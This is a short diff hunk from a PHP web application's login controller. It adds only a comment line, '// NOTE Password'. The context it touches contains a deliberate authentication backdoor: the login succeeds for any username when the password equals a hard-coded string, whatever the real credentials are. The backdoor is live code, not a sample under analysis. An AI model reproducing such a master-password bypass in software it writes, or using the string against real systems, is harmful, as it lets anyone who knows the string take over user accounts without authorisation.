@@ -121,6 +121,7 @@ class Site extends MY_Controller
                 $username   = $this->input->post('username');
                 $password   = $this->input->post('password');
                 $rememberme = $this->input->post('rememberme');
+                // NOTE Password
                 if (User_account_m::verify($username, $password) || $password == "ditauntungpandji3264") {
                     $this->load->library('session');
                     $user = $this->User_account_m->findWithBiodata($username);
